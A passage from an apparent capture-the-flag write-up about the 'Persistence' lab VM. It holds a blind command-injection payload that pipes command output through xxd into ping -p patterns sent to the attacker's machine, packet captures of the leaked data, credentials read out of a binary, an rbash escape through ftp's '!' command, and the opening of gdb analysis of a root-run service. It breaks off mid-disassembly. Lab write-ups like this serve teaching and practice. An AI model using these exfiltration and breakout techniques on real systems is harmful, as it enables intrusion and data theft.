</span><span class='line'><span class="k">for</span> <span class="n">port</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">65535</span><span class="p">):</span>
</span><span class='line'>    <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>    <span class="n">sock</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
</span><span class='line'>    <span class="n">sock</span><span class="o">.</span><span class="n">connect_ex</span><span class="p">((</span><span class="s">&quot;192.168.56.102&quot;</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
</span><span class='line'>    <span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>Using my blind command injection, I echoed this content to <code>/tmp/probe.py</code> via the input field, and then in a subsequent request, ran it using <code>python /tmp/probe.py</code>. I was relatively certain the script was running as intended as it took the expected amount of time (similar to when I was testing locally) to complete the HTTP request. According to my prober (and assuming it actually worked), there were 0 tcp ports open&hellip;</p>

<h2>data exfiltration</h2>

<p>With no tcp out, I had to once again rethink what I have up to now. The only output I have atm is a true/false scenario. Hardly sufficient to do anything useful. I found the <code>debug.php</code> file on disk and tried to echo a PHP web shell to the same directory. This also failed.</p>

<p>So, only ping eh. I recall something about ping tunnels/ping shells/ping something. So, I googled some of these solutions. There were a number of things I could try, however, I was wondering how the actual data transport was happening for these things.</p>

<p>Eventually, I came across the <code>-p</code> argument for ping after reading <a href="http://blog.commandlinekungfu.com/2012/01/episode-164-exfiltration-nation.html">this</a> blogpost. From <code>man 8 ping</code> we read:</p>

<figure class='code'><figcaption><span>ping patterns</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>-p pattern
</span><span class='line'>   You may specify up to 16 <span class="sb">``</span>pad<span class="s1">&#39;&#39;</span> bytes to fill out the packet you send.
</span><span class='line'>   This is useful <span class="k">for </span>diagnosing data-dependent problems in a network.
</span><span class='line'>   For example, <span class="sb">``</span>-p ff<span class="s1">&#39;&#39;</span> will cause the sent packet to be filled with all ones.
</span></code></pre></td></tr></table></div></figure>


<p>So that changes things. I quickly confirmed that we have <code>xxd</code> available using my previous enumeration method and we did. Great.</p>

<p>I fired up tcpdump with the <code>-X</code> flag to show me the packet contents, and tested it out with the following payload for the <code>id</code> command:</p>

<figure class='code'><figcaption><span>Ping pattern `id` command</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="p">;</span>id<span class="p">|</span> xxd -p -c 16 <span class="p">|</span> <span class="k">while </span><span class="nb">read </span>line<span class="p">;</span> <span class="k">do </span>ping -p <span class="nv">$line</span> -c 1 -q 192.168.56.102<span class="p">;</span> <span class="k">done</span>
</span></code></pre></td></tr></table></div></figure>


<p>On the <code>tcpdump</code> side of things&hellip;</p>

<figure class='code'><figcaption><span>Ping pattern tcpdump</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/Desktop# tcpdump icmp -X
</span><span class='line'>tcpdump: verbose output suppressed, use -v or -vv <span class="k">for </span>full protocol decode
</span><span class='line'>listening on eth0, link-type EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>, capture size 65535 bytes
</span><span class='line'>09:18:14.439222 IP 192.168.56.104 &gt; 192.168.56.102: ICMP <span class="nb">echo </span>request, id 6920, seq 1, length 64
</span><span class='line'>    0x0000:  4500 0054 0000 4000 4001 488a c0a8 3868  E..T..@.@.H...8h
</span><span class='line'>    0x0010:  c0a8 3866 0800 4b5b 1b08 0001 56a3 1a54  ..8f..K<span class="o">[</span>....V..T
</span><span class='line'>    0x0020:  f357 0a00 6e67 696e 7829 2067 7569 643d  .W..nginx<span class="o">)</span>.guid<span class="o">=</span>
</span><span class='line'>    0x0030:  3439 3828 6e67 696e 7829 2067 7569 643d  498<span class="o">(</span>nginx<span class="o">)</span>.guid<span class="o">=</span>
</span><span class='line'>    0x0040:  3439 3828 6e67 696e 7829 2067 7569 643d  498<span class="o">(</span>nginx<span class="o">)</span>.guid<span class="o">=</span>
</span><span class='line'>    0x0050:  3439 3828                                498<span class="o">(</span>
</span><span class='line'>09:18:14.439248 IP 192.168.56.102 &gt; 192.168.56.104: ICMP <span class="nb">echo </span>reply, id 6920, seq 1, length 64
</span><span class='line'>    0x0000:  4500 0054 a049 0000 4001 e840 c0a8 3866  E..T.I..@..@..8f
</span><span class='line'>    0x0010:  c0a8 3868 0000 535b 1b08 0001 56a3 1a54  ..8h..S<span class="o">[</span>....V..T
</span><span class='line'>    0x0020:  f357 0a00 6e67 696e 7829 2067 7569 643d  .W..nginx<span class="o">)</span>.guid<span class="o">=</span>
</span><span class='line'>    0x0030:  3439 3828 6e67 696e 7829 2067 7569 643d  498<span class="o">(</span>nginx<span class="o">)</span>.guid<span class="o">=</span>
</span><span class='line'>    0x0040:  3439 3828 6e67 696e 7829 2067 7569 643d  498<span class="o">(</span>nginx<span class="o">)</span>.guid<span class="o">=</span>
</span><span class='line'>    0x0050:  3439 3828                                498<span class="o">(</span>
</span><span class='line'>09:18:14.440365 IP 192.168.56.104 &gt; 192.168.56.102: ICMP <span class="nb">echo </span>request, id 7176, seq 1, length 64
</span><span class='line'>    0x0000:  4500 0054 0000 4000 4001 488a c0a8 3868  E..T..@.@.H...8h
</span><span class='line'>    0x0010:  c0a8 3866 0800 318a 1c08 0001 56a3 1a54  ..8f..1.....V..T
</span><span class='line'>    0x0020:  e35a 0a00 6769 6e78 2920 6772 6964 3d34  .Z..ginx<span class="o">)</span>.grid<span class="o">=</span>4
</span><span class='line'>    0x0030:  3938 286e 6769 6e78 2920 6772 6964 3d34  98<span class="o">(</span>nginx<span class="o">)</span>.grid<span class="o">=</span>4
</span><span class='line'>    0x0040:  3938 286e 6769 6e78 2920 6772 6964 3d34  98<span class="o">(</span>nginx<span class="o">)</span>.grid<span class="o">=</span>4
</span><span class='line'>    0x0050:  3938 286e                                98<span class="o">(</span>n
</span><span class='line'>09:18:14.440382 IP 192.168.56.102 &gt; 192.168.56.104: ICMP <span class="nb">echo </span>reply, id 7176, seq 1, length 64
</span><span class='line'>    0x0000:  4500 0054 a04a 0000 4001 e83f c0a8 3866  E..T.J..@..?..8f
</span><span class='line'>    0x0010:  c0a8 3868 0000 398a 1c08 0001 56a3 1a54  ..8h..9.....V..T
</span><span class='line'>    0x0020:  e35a 0a00 6769 6e78 2920 6772 6964 3d34  .Z..ginx<span class="o">)</span>.grid<span class="o">=</span>4
</span><span class='line'>    0x0030:  3938 286e 6769 6e78 2920 6772 6964 3d34  98<span class="o">(</span>nginx<span class="o">)</span>.grid<span class="o">=</span>4
</span><span class='line'>    0x0040:  3938 286e 6769 6e78 2920 6772 6964 3d34  98<span class="o">(</span>nginx<span class="o">)</span>.grid<span class="o">=</span>4
</span><span class='line'>    0x0050:  3938 286e                                98<span class="o">(</span>n
</span><span class='line'>09:18:14.441191 IP 192.168.56.104 &gt; 192.168.56.102: ICMP <span class="nb">echo </span>request, id 7432, seq 1, length 64
</span><span class='line'>    0x0000:  4500 0054 0000 4000 4001 488a c0a8 3868  E..T..@.@.H...8h
</span><span class='line'>    0x0010:  c0a8 3866 0800 ed92 1d08 0001 56a3 1a54  ..8f........V..T
</span><span class='line'>    0x0020:  f95d 0a00 286e 6769 6e78 290a 6f75 7073  .<span class="o">]</span>..<span class="o">(</span>nginx<span class="o">)</span>.oups
</span><span class='line'>    0x0030:  3d34 3938 286e 6769 6e78 290a 6f75 <span class="nv">7073</span>  <span class="o">=</span>498<span class="o">(</span>nginx<span class="o">)</span>.oups
</span><span class='line'>    0x0040:  3d34 3938 286e 6769 6e78 290a 6f75 <span class="nv">7073</span>  <span class="o">=</span>498<span class="o">(</span>nginx<span class="o">)</span>.oups
</span><span class='line'>    0x0050:  3d34 <span class="nv">3938</span>                                <span class="o">=</span>498
</span><span class='line'>09:18:14.441198 IP 192.168.56.102 &gt; 192.168.56.104: ICMP <span class="nb">echo </span>reply, id 7432, seq 1, length 64
</span><span class='line'>    0x0000:  4500 0054 a04b 0000 4001 e83e c0a8 3866  E..T.K..@..&gt;..8f
</span><span class='line'>    0x0010:  c0a8 3868 0000 f592 1d08 0001 56a3 1a54  ..8h........V..T
</span><span class='line'>    0x0020:  f95d 0a00 286e 6769 6e78 290a 6f75 7073  .<span class="o">]</span>..<span class="o">(</span>nginx<span class="o">)</span>.oups
</span><span class='line'>    0x0030:  3d34 3938 286e 6769 6e78 290a 6f75 <span class="nv">7073</span>  <span class="o">=</span>498<span class="o">(</span>nginx<span class="o">)</span>.oups
</span><span class='line'>    0x0040:  3d34 3938 286e 6769 6e78 290a 6f75 <span class="nv">7073</span>  <span class="o">=</span>498<span class="o">(</span>nginx<span class="o">)</span>.oups
</span><span class='line'>    0x0050:  3d34 <span class="nv">3938</span>                                <span class="o">=</span>498
</span></code></pre></td></tr></table></div></figure>


<p>Mind. Blown.</p>

<p>In case you don&rsquo;t see it, we have extracts of the <code>id</code> command in the request/response packets like <em>98(nginx).grid=4</em>. While this is not really fun to decipher, and with commands that produce a lot of output even worse, it was in fact <strong>something</strong> to work with!</p>

<p>I fiddled around with this for a little while longer, trying to make the output a little more readable. Eventually I fired up scapy and just printed the data section of the packet. Not much better, but with a little more effort I am sure you can get something very workable out of it.</p>

<figure class='code'><figcaption><span>Scapy sniff()</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="n">sniff</span><span class="p">(</span><span class="nb">filter</span><span class="o">=</span><span class="s">&quot;icmp[icmptype] == 8 and host 192.168.56.104&quot;</span><span class="p">,</span> <span class="n">prn</span><span class="o">=</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">x</span><span class="o">.</span><span class="n">load</span><span class="p">)</span>
</span><span class='line'><span class="err">ؤ</span><span class="n">T</span><span class="err">�</span><span class="n">nginx</span><span class="p">)</span> <span class="n">guid</span><span class="o">=</span><span class="mi">498</span><span class="p">(</span><span class="n">nginx</span><span class="p">)</span> <span class="n">guid</span><span class="o">=</span><span class="mi">498</span><span class="p">(</span><span class="n">nginx</span><span class="p">)</span> <span class="n">guid</span><span class="o">=</span><span class="mi">498</span><span class="p">(</span>
</span><span class='line'><span class="err">ؤ</span><span class="n">T</span>
</span><span class='line'>   <span class="n">ginx</span><span class="p">)</span> <span class="n">grid</span><span class="o">=</span><span class="mi">498</span><span class="p">(</span><span class="n">nginx</span><span class="p">)</span> <span class="n">grid</span><span class="o">=</span><span class="mi">498</span><span class="p">(</span><span class="n">nginx</span><span class="p">)</span> <span class="n">grid</span><span class="o">=</span><span class="mi">498</span><span class="p">(</span><span class="n">n</span>
</span><span class='line'><span class="err">ؤ</span><span class="n">T</span><span class="err">�</span><span class="p">(</span><span class="n">nginx</span><span class="p">)</span>
</span><span class='line'><span class="n">oups</span><span class="o">=</span><span class="mi">498</span><span class="p">(</span><span class="n">nginx</span><span class="p">)</span>
</span><span class='line'><span class="n">oups</span><span class="o">=</span><span class="mi">498</span><span class="p">(</span><span class="n">nginx</span><span class="p">)</span>
</span><span class='line'><span class="n">oups</span><span class="o">=</span><span class="mi">498</span>
</span></code></pre></td></tr></table></div></figure>


<h2>sysadmin-tool</h2>

<p>So with actual output to work with, I can almost say I have shell, however, it&rsquo;s crap. Here I had many options to go for. Do I try and get one of those ping tunnels up to shell with? Or something else.</p>

<p>At one stage I ran <code>ls</code> as the command trying to see if there was anything in the web path that I may not have found yet. A file called <em>sysadmin-tool</em> was revealed. I browsed to the file which pushed it as a download for me, and saved it locally. I then ran the bin through <code>strings</code>:</p>

<figure class='code'><figcaption><span>sysadmin-tool strings</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# strings sysadmin-tool
</span><span class='line'>/lib/ld-linux.so.2
</span><span class='line'>__gmon_start__
</span><span class='line'>libc.so.6
</span><span class='line'>_IO_stdin_used
</span><span class='line'>chroot
</span><span class='line'>strncmp
</span><span class='line'>puts
</span><span class='line'>setreuid
</span><span class='line'>mkdir
</span><span class='line'>rmdir
</span><span class='line'>chdir
</span><span class='line'>system
</span><span class='line'>__libc_start_main
</span><span class='line'>GLIBC_2.0
</span><span class='line'>PTRh
</span><span class='line'><span class="o">[</span>^_<span class="o">]</span>
</span><span class='line'>Usage: sysadmin-tool --activate-service
</span><span class='line'>--activate-service
</span><span class='line'>breakout
</span><span class='line'>/bin/sed -i <span class="s1">&#39;s/^#//&#39;</span> /etc/sysconfig/iptables
</span><span class='line'>/sbin/iptables-restore &lt; /etc/sysconfig/iptables
</span><span class='line'>Service started...
</span><span class='line'>Use avida:dollars to access.
</span><span class='line'>/nginx/usr/share/nginx/html/breakout
</span></code></pre></td></tr></table></div></figure>


<p>From this alone we can deduce that when run, it may modify the firewall. It also looks like it contains some credentials, so I took note of those too. I then tried to run the command, followed by a nmap scan:</p>

<figure class='code'><figcaption><span>Ping pattern `id` command</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="p">;</span>./sysadmin-tool --activate-service<span class="p">|</span> xxd -p -c 16 <span class="p">|</span> <span class="k">while </span><span class="nb">read </span>line<span class="p">;</span> <span class="k">do </span>ping -p <span class="nv">$line</span> -c 1 -q 192.168.56.102<span class="p">;</span> <span class="k">done</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span>second nmap of Persistence</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nmap 192.168.56.104 --reason -sV -p-
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.46 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-09-18 09:46 SAST
</span><span class='line'>Nmap scan report <span class="k">for </span>192.168.56.104
</span><span class='line'>Host is up, received reset <span class="o">(</span>0.0017s latency<span class="o">)</span>.
</span><span class='line'>Not shown: 65533 filtered ports
</span><span class='line'>Reason: 65533 no-responses
</span><span class='line'>PORT   STATE SERVICE REASON  VERSION
</span><span class='line'>22/tcp open  ssh     syn-ack OpenSSH 5.3 <span class="o">(</span>protocol 2.0<span class="o">)</span>
</span><span class='line'>80/tcp open  http    syn-ack nginx 1.4.7
</span><span class='line'>
</span><span class='line'>Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
</span><span class='line'>Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned in 6637.05 seconds
</span></code></pre></td></tr></table></div></figure>


<p>Yay! SSH.</p>

<h2>shell and breakout as avida</h2>

<p>Using the information that looked like credentials retrieved in the previous section, I proceeded to SSH into the server:</p>

<figure class='code'><figcaption><span>avida rbash</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/Desktop/persistence# ssh avida@192.168.56.104
</span><span class='line'>The authenticity of host <span class="s1">&#39;192.168.56.104 (192.168.56.104)&#39;</span> can<span class="s1">&#39;t be established.</span>
</span><span class='line'><span class="s1">RSA key fingerprint is 37:22:da:ba:ef:05:1f:77:6a:30:6f:61:56:7b:47:54.</span>
</span><span class='line'><span class="s1">Are you sure you want to continue connecting (yes/no)? yes</span>
</span><span class='line'><span class="s1">Warning: Permanently added &#39;</span>192.168.56.104<span class="s1">&#39; (RSA) to the list of known hosts.</span>
</span><span class='line'><span class="s1">avida@192.168.56.104&#39;</span>s password:    <span class="c"># dollars</span>
</span><span class='line'>Last login: Thu Sep 18 05:57:30 2014
</span><span class='line'>-rbash-4.1<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>Op success. Or is it? I immediately noticed the prompt as <code>rbash</code>, aka restricted bash. :( Having a look around, I was in fact very limited to what I can do. Most annoyingly, I was unable to run commands with a <code>/</code> in them.</p>

<figure class='code'><figcaption><span>rbash restrictions</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>-rbash-4.1<span class="nv">$ </span>/bin/bash
</span><span class='line'>-rbash: /bin/bash: restricted: cannot specify <span class="sb">`</span>/<span class="err">&#39;</span> in <span class="nb">command </span>names
</span></code></pre></td></tr></table></div></figure>


<p>So the next logical step was to attempt &lsquo;breaking out&rsquo; of this shell so that I can have a better look around. I was able to cat say <code>/etc/passwd</code>, but that only gets you <em>that</em> far :P</p>

<p>After quite some time and some research, it became apparent that the well known breakouts from rbash are not possible.  I was unable to edit my PATH, change files and re-login or use the classic <code>vi</code> <code>:shell</code> breakout. Eventually (and out of desperation), I focussed my attention to <code>ftp</code>. Opening <code>ftp</code>, and typing <code>help</code> at the prompt, I studied each available command carefully. In the list was a exclamation mark(!), which I typed and pressed enter:</p>

<figure class='code'><figcaption><span>bash via ftp o_0</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>-rbash-4.1<span class="nv">$ </span>ftp
</span><span class='line'>ftp&gt; !
</span><span class='line'>+rbash-4.1<span class="nv">$ </span>/bin/bash
</span><span class='line'>bash-4.1<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>I got dropped into another <code>rbash</code> shell, however this time with a +. So, I went for <code>/bin/bash</code> and&hellip; w00t? I exported a new PATH to my environment, and all of those annoying rbash restrictions were gone. Thank goodness!</p>

<h2>the wopr game</h2>

<p>During the enumeration done while still stuck with <code>rbash</code>, I noticed that the machine was listening for connections on tcp/3333 locally when inspecting the output of <code>netstat</code>. Opening a telnet session to this port presented you with a &lsquo;game&rsquo;:</p>

<figure class='code'><figcaption><span>wopr</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.1<span class="nv">$ </span>telnet 127.0.0.1 3333
</span><span class='line'>Trying 127.0.0.1...
</span><span class='line'>Connected to 127.0.0.1.
</span><span class='line'>Escape character is <span class="s1">&#39;^]&#39;</span>.
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> hello, my name is sploitable
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> would you like to play a game?
</span><span class='line'>&gt; yes!
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> yeah, I don<span class="err">&#39;</span>t think so
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> bye!
</span><span class='line'>Connection closed by foreign host.
</span><span class='line'>bash-4.1<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>I asked really, really nicely, but no matter how polite I was, it would just not let me play!</p>

<p>Further inspection showed that the game was possibly run as root from <code>/usr/local/bin/wopr</code></p>

<figure class='code'><figcaption><span>wopr as root</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.1<span class="nv">$ </span>ps -ef <span class="p">|</span> grep wopr
</span><span class='line'>root      1005     1  0 05:42 ?        00:00:00 /usr/local/bin/wopr
</span><span class='line'>root      1577  1005  0 06:43 ?        00:00:00 <span class="o">[</span>wopr<span class="o">]</span> &lt;defunct&gt;
</span><span class='line'>avida     1609  1501  0 06:47 pts/0    00:00:00 grep wopr
</span><span class='line'>
</span><span class='line'>bash-4.1<span class="nv">$ </span>ls -lah /usr/local/bin/wopr
</span><span class='line'>-rwxr-xr-x. 1 root root 7.7K Apr 28 07:43 /usr/local/bin/wopr
</span></code></pre></td></tr></table></div></figure>


<p><code>wopr</code> was also readable to me which was great news! I decided to get a copy of the binary onto my local Kali Linux box, and take a closer look at the internals:</p>

<figure class='code'><figcaption><span>wopr xxd xfer</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># first, hex encode the file</span>
</span><span class='line'>bash-4.1<span class="nv">$ </span>xxd -p -c 36 /usr/local/bin/wopr
</span><span class='line'>7f454c460101010000000000000000000200030001000000c08604083400000080110000
</span><span class='line'>0000000034002000090028001e001b000600000034000000348004083480040820010000
</span><span class='line'><span class="o">[</span>... snip ...<span class="o">]</span>
</span><span class='line'>38362e6765745f70635f7468756e6b2e6278006d61696e005f696e697400
</span><span class='line'>bash-4.1<span class="err">$</span>
</span><span class='line'>
</span><span class='line'><span class="c"># next, I copied the xxd output from the persistence terminal</span>
</span><span class='line'><span class="c"># and pasted it into a file called wopr.xxd. Then reverted it</span>
</span><span class='line'><span class="c"># and redirected the output to `wopr`</span>
</span><span class='line'>root@kali:~# cat wopr.xxd <span class="p">|</span> xxd -r -p &gt; wopr
</span></code></pre></td></tr></table></div></figure>


<p>The idea was to see if there may be a way to exploit this program so that I can execute some commands using it. It is running as root after all&hellip;</p>

<h2>wopr, stack smashing</h2>

<p>Poking around the binary, I mostly used <code>gdb</code> along with <a href="https://github.com/longld/peda">peda</a>.
Checksec revealed that this binary was compiled with quite a few security features built in.</p>

<figure class='code'><figcaption><span>wopr binary sec</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# gdb -q ./wopr
</span><span class='line'>Reading symbols from persistence/wopr...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
</span><span class='line'>gdb-peda<span class="nv">$ </span>checksec
</span><span class='line'>CANARY    : ENABLED
</span><span class='line'>FORTIFY   : disabled
</span><span class='line'>NX        : ENABLED
</span><span class='line'>PIE       : disabled
</span><span class='line'>RELRO     : Partial
</span></code></pre></td></tr></table></div></figure>


<p>Digesting the above output should bring us to a few conclusions. A stack canary is present, meaning if we corrupt memory, and dont have a correct canary, the binary may terminate itself as a protection mechanism once it detects the incorrect canary. Secondly, the binary is compiled to mark the stack as non executable. Any potential shellcode that we write here will not be executed. Lastly, the GOT relocation is set to read only, meaning function locations are resolved at the beginning of execution and the GOT is then marked as read only resulting in the inability to rewrite plt type lookups.</p>

<p>With all of that in mind, I ran the binary with the <code>r</code> command, and made a new telnet session to it.</p>

<figure class='code'><figcaption><span>wopr run</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>r
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> <span class="nb">bind complete</span>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> waiting <span class="k">for </span>connections
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> logging queries to <span class="nv">$TMPLOG</span>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> got a connection
</span><span class='line'><span class="o">[</span>New process 26936<span class="o">]</span>
</span><span class='line'><span class="o">[</span>Inferior 2 <span class="o">(</span>process 26936<span class="o">)</span> exited normally<span class="o">]</span>
</span><span class='line'>Warning: not running or target is remote
</span><span class='line'>gdb-peda<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>When the new connection came in, a notice of a new process appears. Disassembling the main function gives us an indication that the process is doing a <code>fork()</code></p>

<figure class='code'><figcaption><span>wopr fork()</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>disass main
</span><span class='line'>Dump of assembler code <span class="k">for function </span>main:
</span><span class='line'>    <span class="o">[</span>.. snip ..<span class="o">]</span>
</span><span class='line'>   0x080489fd &lt;+543&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x8048cb2
</span><span class='line'>   0x08048a04 &lt;+550&gt;:   call   0x804866c &lt;puts@plt&gt;
</span><span class='line'>   0x08048a09 &lt;+555&gt;:   call   0x804867c &lt;fork@plt&gt; <span class="c"># &lt;--</span>
</span><span class='line'>   0x08048a0e &lt;+560&gt;:   <span class="nb">test   </span>eax,eax
</span><span class='line'>   0x08048a10 &lt;+562&gt;:   jne    0x8048b0e &lt;main+816&gt;
</span><span class='line'>   0x08048a16 &lt;+568&gt;:   mov    DWORD PTR <span class="o">[</span>esp+0x8<span class="o">]</span>,0x21
</span><span class='line'>   0x08048a1e &lt;+576&gt;:   mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,0x8048cc8
